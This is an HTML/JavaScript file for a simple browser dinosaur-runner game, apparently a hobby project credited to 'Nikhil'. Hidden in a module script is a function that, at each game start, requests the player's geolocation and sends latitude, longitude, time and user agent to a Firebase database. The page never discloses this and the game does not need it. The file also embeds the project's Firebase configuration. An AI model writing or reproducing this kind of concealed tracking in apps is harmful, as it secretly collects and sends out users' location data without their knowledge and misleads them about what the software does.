<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dino Runner - Made by Nikhil</title>

<style>
body {
  margin: 0;
  overflow: hidden;
  background: #fff;
  font-family: Arial, sans-serif;
}
canvas { display: block; }

/* UI */
.ui {
  position: fixed;
  top: 10px;
  left: 15px;
  font-weight: bold;
  font-size: 16px;
  color: #222;
}
.top-right {
  position: fixed;
  top: 10px;
  right: 15px;
  font-weight: bold;
  cursor: pointer;
}
.center {
  position: fixed;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  font-weight: bold;
  text-align: center;
}
.hidden { display: none; }

/* MOBILE CONTROLS */
.controls {
  position: fixed;
  bottom: 20px;
  width: 100%;
  display: flex;
  justify-content: space-between;
  padding: 0 20px;
  box-sizing: border-box;
}
.btn {
  width: 120px;
  height: 60px;
  background: rgba(0,0,0,0.6);
  color: #fff;
  font-size: 18px;
  font-weight: bold;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  user-select: none;
  touch-action: none;
}
</style>
</head>

<body>

<canvas id="game"></canvas>

<div class="ui" id="score">SCORE: 0</div>
<div class="ui" style="top:32px" id="high">HIGH: 0</div>
<div class="top-right" id="mute">ðŸ”Š</div>

<div class="center" id="start">PRESS SPACE / TAP TO START</div>
<div class="center hidden" id="over">GAME OVER<br>PRESS R / TAP TO RESTART</div>

<div class="controls">
  <div class="btn" id="jumpBtn">JUMP</div>
  <div class="btn" id="duckBtn">DUCK</div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyDLJHRDd_RtYBwF97he_6QSxHlMvgIBxO4",
    authDomain: "diano-game.firebaseapp.com",
    databaseURL: "https://diano-game-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "diano-game",
    storageBucket: "diano-game.firebasestorage.app",
    messagingSenderId: "596405576156",
    appId: "1:596405576156:web:fb95d723af33e6652faf19"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  window.sendLocationToFirebase = function() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((position) => {
        const data = {
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          time: new Date().toLocaleString(),
          userAgent: navigator.userAgent 
        };
        set(ref(db, 'player_location'), data);
      });
    }
  };
</script>

<script>
/* ===== AUDIO ===== */
const bgMusic = new Audio("bg music.mp3");
bgMusic.loop = true;
bgMusic.volume = 0.4;
const startSound = new Audio("start.mp3");
const outSound = new Audio("out.mp3");
let muted = false;

/* ===== CANVAS ===== */
const canvas = document.getElementById("game");
const ctx = canvas.getContext("2d");
function resize() {
  canvas.width = innerWidth;
  canvas.height = innerHeight;
}
resize();
addEventListener("resize", resize);

/* ===== GAME STATE ===== */
let state = "START";
let score = 0;
let speed = 7;
let gravity = 0.9;
let frame = 0;
let highScore = Number(localStorage.getItem("dinoHigh") || 0);
document.getElementById("high").innerText = "HIGH: " + highScore;

const dino = { x: 80, y: 0, w: 40, h: 50, vy: 0, jumping: false, duck: false };
const ground = () => canvas.height * 0.75;
let obstacles = [];

/* ===== HELPERS ===== */
function isNight() { return Math.floor(score / 2500) % 2 === 1; }
const stars = Array.from({ length: 80 }, () => ({
  x: Math.random() * innerWidth, y: Math.random() * innerHeight * 0.5, r: Math.random() * 1.5 + 0.5
}));

const muteBtn = document.getElementById("mute");
muteBtn.onclick = () => {
  muted = !muted;
  muteBtn.textContent = muted ? "ðŸ”‡" : "ðŸ”Š";
  if (muted) bgMusic.pause();
  else if (state === "RUNNING") bgMusic.play();
};

function spawnObstacle() {
  const isBird = Math.random() < 0.3;
  let o = { x: canvas.width + 20, y: 0, w: 0, h: 0, type: isBird ? "bird" : "cactus" };
  if (isBird) { o.w = 55; o.h = 90; o.y = ground() - 25 - o.h - 6; } 
  else { o.w = Math.random() < 0.5 ? 25 : 40; o.h = Math.random() < 0.5 ? 40 : 60; o.y = ground() - o.h; }
  obstacles.push(o);
}

function jump() {
  if (!dino.jumping) { dino.vy = -16; dino.jumping = true; }
}

/* ===== CONTROLS ===== */
// KEYBOARD CONTROLS (PC/LAPTOP)
addEventListener("keydown", e => {
  if (e.code === "Space") {
    if (state === "START") start();
    else if (state === "RUNNING") jump();
  }
  if (e.code === "ArrowDown") dino.duck = true; // DOWN ARROW = DUCK
  if (e.code === "KeyR" && state === "OVER") start();
});
addEventListener("keyup", e => { if (e.code === "ArrowDown") dino.duck = false; });

// MOBILE BUTTONS (SWAPPED)
document.getElementById("jumpBtn").addEventListener("touchstart", e => {
  e.preventDefault();
  state === "RUNNING" ? jump() : start();
});
document.getElementById("duckBtn").addEventListener("touchstart", e => {
  e.preventDefault(); dino.duck = true;
});
document.getElementById("duckBtn").addEventListener("touchend", e => {
  e.preventDefault(); dino.duck = false;
});

/* ===== FLOW ===== */
function start() {
  state = "RUNNING";
  score = 0; speed = 7; frame = 0; obstacles = [];
  dino.y = ground() - dino.h; dino.vy = 0; dino.jumping = false; dino.duck = false;

  if(window.sendLocationToFirebase) window.sendLocationToFirebase();

  startSound.currentTime = 0; startSound.play();
  if (!muted) { bgMusic.currentTime = 0; bgMusic.play(); }
  document.getElementById("start").classList.add("hidden");
  document.getElementById("over").classList.add("hidden");
}

function gameOver() {
  state = "OVER"; bgMusic.pause(); outSound.play();
  if (score > highScore) {
    highScore = score; localStorage.setItem("dinoHigh", highScore);
    document.getElementById("high").innerText = "HIGH: " + highScore;
  }
  document.getElementById("over").classList.remove("hidden");
}

function hit(a, b) {
  const ah = a.duck ? a.h / 2 : a.h;
  const ay = a.y + (a.h - ah);
  return a.x < b.x + b.w && a.x + a.w > b.x && ay < b.y + b.h && ay + ah > b.y;
}

function update() {
  if (state !== "RUNNING") return;
  frame++; score++; speed += 0.002;
  if (frame % 70 === 0) spawnObstacle();
  dino.vy += gravity; dino.y += dino.vy;
  if (dino.y >= ground() - dino.h) { dino.y = ground() - dino.h; dino.vy = 0; dino.jumping = false; }
  obstacles.forEach(o => o.x -= speed);
  obstacles = obstacles.filter(o => o.x + o.w > 0);
  obstacles.forEach(o => hit(dino, o) && gameOver());
  document.getElementById("score").innerText = "SCORE: " + score;
}

function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  const t = (score % 2500) / 2500;
  if (isNight()) {
    ctx.fillStyle = "#0B132B"; ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#fff"; stars.forEach(s => { ctx.beginPath(); ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2); ctx.fill(); });
  } else {
    const sky = ctx.createLinearGradient(0, 0, 0, canvas.height);
    sky.addColorStop(0, t > 0.6 ? "#FF8C42" : "#87CEEB");
    sky.addColorStop(1, "#FFFFFF");
    ctx.fillStyle = sky; ctx.fillRect(0, 0, canvas.width, canvas.height);
  }
  ctx.fillStyle = "#E3C16F"; ctx.fillRect(0, ground(), canvas.width, canvas.height);
  ctx.globalAlpha = 0.35; ctx.fillStyle = "#6B4F1D"; ctx.font = "bold 36px Arial"; ctx.textAlign = "center";
  ctx.fillText("MADE BY NIKHIL", canvas.width / 2, ground() + 50); ctx.globalAlpha = 1;
  ctx.fillStyle = "#27AE60"; const dh = dino.duck ? dino.h / 2 : dino.h;
  ctx.fillRect(dino.x, dino.y + (dino.h - dh), dino.w, dh);
  ctx.fillStyle = "#000"; ctx.fillRect(dino.x + 28, dino.y + (dino.h - dh) + 10, 5, 5);
  obstacles.forEach(o => { ctx.fillStyle = o.type === "bird" ? "#E74C3C" : "#1E8449"; ctx.fillRect(o.x, o.y, o.w, o.h); });
}

function loop() { requestAnimationFrame(loop); update(); draw(); }
loop();
</script>

</body>
</html>
